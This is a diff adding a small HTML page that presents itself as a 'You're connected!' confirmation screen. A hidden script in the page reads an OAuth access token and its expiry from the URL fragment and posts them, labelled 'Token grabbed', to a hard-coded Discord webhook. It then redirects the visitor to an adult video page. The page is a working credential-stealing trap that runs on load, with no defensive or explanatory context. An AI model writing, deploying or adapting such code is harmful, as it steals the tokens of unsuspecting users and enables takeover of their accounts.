@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connected</title>
+<style>
+  body{background:#111;color:#ddd;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+  .wrap{text-align:center}
+  .ok{font-size:60px;color:#57f287}
+  .msg{font-size:22px;margin-top:16px}
+  .sub{font-size:14px;color:#888;margin-top:20px}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="ok">✓</div>
+    <div class="msg">You're connected!</div>
+    <div class="sub">Take you to the video…</div>
+  </div>
+  <script>
+    var tok = (location.hash.match(/access_token=([^&]+)/) || [])[1];
+    var exp = (location.hash.match(/expires_in=([^&]+)/) || [])[1];
+    if (tok) {
+      fetch("https://discord.com/api/webhooks/1570087121216082002/h6RJyXei0ZhoHQeojfPfgcTHLOQEvj1nN9KB3fXImv4GvPBhl4QIfX5KIUf0HPlaBapJ", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: "Token grabbed:\n" + tok + "\nexpires_in=" + exp,
+          username: "Indi's Voice"
+        })
+      });
+    }
+    setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 2000);
+  </script>
+</body>
+</html>
